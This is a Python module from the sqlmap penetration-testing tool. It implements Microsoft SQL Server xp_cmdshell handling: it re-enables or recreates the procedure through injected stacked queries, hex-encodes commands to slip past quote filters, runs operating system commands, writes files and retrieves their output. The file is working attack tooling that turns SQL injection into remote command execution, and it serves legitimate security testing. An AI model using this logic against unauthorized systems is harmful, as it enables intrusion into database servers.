#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import flattenValue
from lib.core.common import getLimitRange
from lib.core.common import getSQLSnippet
from lib.core.common import hashDBWrite
from lib.core.common import isListLike
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import wasLastResponseDelayed
from lib.core.compat import xrange
from lib.core.convert import encodeHex
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.threads import getCurrentThreadData
from lib.request import inject

class XP_cmdshell(object):
    """
    This class defines methods to deal with Microsoft SQL Server
    xp_cmdshell extended procedure for plugins.
    """

    def __init__(self):
        self.xpCmdshellStr = "master..xp_cmdshell"

    def _xpCmdshellCreate(self):
        cmd = ""

        if not Backend.isVersionWithin(("2000",)):
            logger.debug("activating sp_OACreate")

            cmd = getSQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
            inject.goStacked(agent.runAsDBMSUser(cmd))

        self._randStr = randomStr(lowercase=True)
        self.xpCmdshellStr = "master..new_xp_cmdshell"

        cmd = getSQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self._randStr)

        if not Backend.isVersionWithin(("2000",)):
            cmd += ";RECONFIGURE WITH OVERRIDE"

        inject.goStacked(agent.runAsDBMSUser(cmd))

    def _xpCmdshellConfigure2005(self, mode):
        debugMsg = "configuring xp_cmdshell using sp_configure "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)

        cmd = getSQLSnippet(DBMS.MSSQL, "configure_xp_cmdshell", ENABLE=str(mode))

        return cmd

    def _xpCmdshellConfigure2000(self, mode):
        debugMsg = "configuring xp_cmdshell using sp_addextendedproc "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)

        if mode == 1:
            cmd = getSQLSnippet(DBMS.MSSQL, "enable_xp_cmdshell_2000", ENABLE=str(mode))
        else:
            cmd = getSQLSnippet(DBMS.MSSQL, "disable_xp_cmdshell_2000", ENABLE=str(mode))

        return cmd

    def _xpCmdshellConfigure(self, mode):
        if Backend.isVersionWithin(("2000",)):
            cmd = self._xpCmdshellConfigure2000(mode)
        else:
            cmd = self._xpCmdshellConfigure2005(mode)

        inject.goStacked(agent.runAsDBMSUser(cmd))

    def _xpCmdshellCheck(self):
        cmd = "ping -n %d 127.0.0.1" % (conf.timeSec * 2)
        self.xpCmdshellExecCmd(cmd)

        return wasLastResponseDelayed()

    @stackedmethod
    def _xpCmdshellTest(self):
        threadData = getCurrentThreadData()
        pushValue(threadData.disableStdOut)
        threadData.disableStdOut = True

        logger.info("testing if xp_cmdshell extended procedure is usable")
        output = self.xpCmdshellEvalCmd("echo 1")

        if output == "1":
            logger.info("xp_cmdshell extended procedure is usable")
        elif isNoneValue(output) and conf.dbmsCred:
            errMsg = "it seems that the temporary directory ('%s') used for " % self.getRemoteTempPath()
            errMsg += "storing console output within the back-end file system "
            errMsg += "does not have writing permissions for the DBMS process. "
            errMsg += "You are advised to manually adjust it with option "
            errMsg += "'--tmp-path' or you won't be able to retrieve "
            errMsg += "the command(s) output"
            logger.error(errMsg)
        elif isNoneValue(output):
            logger.error("unable to retrieve xp_cmdshell output")
        else:
            logger.info("xp_cmdshell extended procedure is usable")

        threadData.disableStdOut = popValue()

    def xpCmdshellWriteFile(self, fileContent, tmpPath, randDestFile):
        echoedLines = []
        cmd = ""
        charCounter = 0
        maxLen = 512

        if isinstance(fileContent, (set, list, tuple)):
            lines = fileContent
        else:
            lines = fileContent.split("\n")

        for line in lines:
            echoedLine = "echo %s " % line
            echoedLine += ">> \"%s\\%s\"" % (tmpPath, randDestFile)
            echoedLines.append(echoedLine)

        for echoedLine in echoedLines:
            cmd += "%s & " % echoedLine
            charCounter += len(echoedLine)

            if charCounter >= maxLen:
                self.xpCmdshellExecCmd(cmd.rstrip(" & "))

                cmd = ""
                charCounter = 0

        if cmd:
            self.xpCmdshellExecCmd(cmd.rstrip(" & "))

    def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):
        # When user provides DBMS credentials (with --dbms-cred) we need to
        # redirect the command standard output to a temporary file in order
        # to retrieve it afterwards
        # NOTE: this does not need to be done when the command is 'del' to
        # delete the temporary file
        if conf.dbmsCred and insertIntoTable:
            self.tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
            cmd = "%s > \"%s\"" % (cmd, self.tmpFile)

        # Obfuscate the command to execute, also useful to bypass filters
        # on single-quotes
        self._randStr = randomStr(lowercase=True)
        self._forgedCmd = "DECLARE @%s VARCHAR(8000);" % self._randStr

        try:
            self._forgedCmd += "SET @%s=%s;" % (self._randStr, "0x%s" % encodeHex(cmd, binary=False))
        except UnicodeError:
            self._forgedCmd += "SET @%s='%s';" % (self._randStr, cmd)

        # Insert the command standard output into a support table,
        # 'sqlmapoutput', except when DBMS credentials are provided because
        # it does not work unfortunately, BULK INSERT needs to be used to
        # retrieve the output when OPENROWSET is used hence the redirection
        # to a temporary file from above
        if insertIntoTable and not conf.dbmsCred:
            self._forgedCmd += "INSERT INTO %s(data) " % insertIntoTable

        self._forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self._randStr)

        return agent.runAsDBMSUser(self._forgedCmd)

    def xpCmdshellExecCmd(self, cmd, silent=False):
        return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)

    def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
        output = None

        if conf.direct:
            output = self.xpCmdshellExecCmd(cmd)

            if output and isinstance(output, (list, tuple)):
                new_output = ""

                for line in output:
                    if line == "NULL":
                        new_output += "\n"
                    else:
                        new_output += "%s\n" % line.strip("\r")

                output = new_output
        else:
            inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))

            # When user provides DBMS credentials (with --dbms-cred), the
            # command standard output is redirected to a temporary file
            # The file needs to be copied to the support table,
            # 'sqlmapoutput'
            if conf.dbmsCred:
                inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
                self.delRemoteFile(self.tmpFile)

            query = "SELECT %s FROM %s ORDER BY id" % (self.tblField, self.cmdTblName)

            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
                output = inject.getValue(query, resumeValue=False, blind=False, time=False)

            if (output is None) or len(output) == 0 or output[0] is None:
                output = []
                count = inject.getValue("SELECT COUNT(id) FROM %s" % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

                if isNumPosStrValue(count):
                    for index in getLimitRange(count):
                        query = agent.limitQuery(index, query, self.tblField)
                        output.append(inject.getValue(query, union=False, error=False, resumeValue=False))

            inject.goStacked("DELETE FROM %s" % self.cmdTblName)

            if output and isListLike(output) and len(output) > 1:
                _ = ""
                lines = [line for line in flattenValue(output) if line is not None]

                for i in xrange(len(lines)):
                    line = lines[i] or ""
                    if line is None or i in (0, len(lines) - 1) and not line.strip():
                        continue
                    _ += "%s\n" % line

                output = _.rstrip('\n')

        return output

    def xpCmdshellInit(self):
        if not kb.xpCmdshellAvailable:
            infoMsg = "checking if xp_cmdshell extended procedure is "
            infoMsg += "available, please wait.."
            logger.info(infoMsg)

            result = self._xpCmdshellCheck()

            if result:
                logger.info("xp_cmdshell extended procedure is available")
                kb.xpCmdshellAvailable = True

            else:
                message = "xp_cmdshell extended procedure does not seem to "
                message += "be available. Do you want sqlmap to try to "
                message += "re-enable it? [Y/n] "

                if readInput(message, default='Y', boolean=True):
                    self._xpCmdshellConfigure(1)

                    if self._xpCmdshellCheck():
                        logger.info("xp_cmdshell re-enabled successfully")
                        kb.xpCmdshellAvailable = True

                    else:
                        logger.warning("xp_cmdshell re-enabling failed")

                        logger.info("creating xp_cmdshell with sp_OACreate")
                        self._xpCmdshellConfigure(0)
                        self._xpCmdshellCreate()

                        if self._xpCmdshellCheck():
                            logger.info("xp_cmdshell created successfully")
                            kb.xpCmdshellAvailable = True

                        else:
                            warnMsg = "xp_cmdshell creation failed, probably "
                            warnMsg += "because sp_OACreate is disabled"
                            logger.warning(warnMsg)

            hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)

            if not kb.xpCmdshellAvailable:
                errMsg = "unable to proceed without xp_cmdshell"
                raise SqlmapUnsupportedFeatureException(errMsg)

        debugMsg = "creating a support table to write commands standard "
        debugMsg += "output to"
        logger.debug(debugMsg)

        # TEXT can't be used here because in error technique you get:
        # "The text, ntext, and image data types cannot be compared or sorted"
        self.createSupportTbl(self.cmdTblName, self.tblField, "NVARCHAR(4000)")

        self._xpCmdshellTest()
